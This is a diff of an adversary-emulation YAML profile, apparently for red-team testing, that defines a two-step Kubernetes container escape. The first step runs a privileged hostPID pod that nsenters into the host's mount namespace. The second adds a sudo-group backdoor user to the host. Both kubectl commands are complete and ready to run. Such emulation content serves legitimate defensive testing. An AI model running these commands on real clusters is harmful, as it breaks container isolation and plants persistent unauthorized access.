@@ -1,88 +1,32 @@
-- tactic: privilege-escalation
-  technique_name: Escape to Host
-  technique_id: T1611
-  name: Deploy container using nsenter container escape (Step Create Pod)
-  description: 'In this escape `kubectl` is used to launch a new pod, with a container
-    that has the host pids mapped into the container (`hostPID:true`). It uses the
-    alpine linux container image. It runs with privilege on the host (`privileged:true`).
-    When the container is launched the command `nsenter --mount=/proc/1/ns/mnt --
-    /bin/bash` is ran. Since the host processes have been mapped into the container,
-    the container enters the host namespace, escaping the container.
-
-    Additional Details:
-
-    - https://twitter.com/mauilion/status/1129468485480751104
-    - https://securekubernetes.com/scenario_2_attack/
-    '
-  executors:
-  - name: sh
-    platform: linux
-    command: |
+id: dec00bf9-d63d-4d38-a4e0-9a31389d7337
+name: Container Escape Host
+description: ift808
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- 46601279197c406492ca112d60723de3
+- 26601279197c406492ca112d60723d85
+abilities:
+ 46601279197c406492ca112d60723de3:
+  name:  Deploy container using nsenter container escape (Step 1 Create Pod)
+  tactic:  privilege-escalation
+  technique_name:  "Escape to Host"
+  technique_id:  T1611
+  executors: 
+   - sh:
+     platform: linux
+     command: |
        kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod \ 
         --restart=Never --image alpine --overrides '{"spec":{"hostPID": true, "containers": [{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
-    code: null
-    language: null
-    build_target: null
-    payloads: []
-    uploads: []
-    timeout: 120
-    parsers: []
-    cleanup: []
-    variations: []
-    additional_info: {}
-  requirements: []
-  privilege: ''
-  repeatable: false
-  buckets:
-  - privilege-escalation
-  additional_info: {}
-  access: {}
-  singleton: false
-  plugin: ''
-  delete_payload: true
-  id: 46601279197c406492ca112d60723de3
-- tactic: privilege-escalation
-  technique_name: Escape to Host
-  technique_id: T1611
-  name: Deploy container using nsenter container escape (Step 2 Add Persistence User)
-  description: 'In this escape `kubectl` is used to launch a new pod, with a container
-    that has the host pids mapped into the container (`hostPID:true`). It uses the
-    alpine linux container image. It runs with privilege on the host (`privileged:true`).
-    When the container is launched the command `nsenter --mount=/proc/1/ns/mnt --
-    /bin/bash` is ran. Since the host processes have been mapped into the container,
-    the container enters the host namespace, escaping the container.
-
-    Additional Details:
-
-    - https://twitter.com/mauilion/status/1129468485480751104
-    - https://securekubernetes.com/scenario_2_attack/
-    '
-  executors:
-  - name: sh
-    platform: linux
-    command: |
+       
+ 26601279197c406492ca112d60723d85:
+  name:  Deploy container using nsenter container escape (Step 2 Add Persistence User)
+  tactic:  privilege-escalation
+  technique_name:  "Escape to Host"
+  technique_id:  T1611
+  executors: 
+   - sh:
+     platform: linux
+     command: |
        kubectl exec -it atomic-nsenter-escape-pod -- cat /etc/passwd && \
        kubectl exec -it atomic-nsenter-escape-pod -- useradd -p escalation -G sudo escalation-user && \
        kubectl exec -it atomic-nsenter-escape-pod -- cat /etc/passwd
-    code: null
-    language: null
-    build_target: null
-    payloads: []
-    uploads: []
-    timeout: 120
-    parsers: []
-    cleanup:
-    - kubectl --context kind-atomic-cluster delete pod atomic-nsenter-escape-pod
-    variations: []
-    additional_info: {}
-  requirements: []
-  privilege: ''
-  repeatable: false
-  buckets:
-  - privilege-escalation
-  additional_info: {}
-  access: {}
-  singleton: false
-  plugin: ''
-  delete_payload: true
-  id: 26601279197c406492ca112d60723d85
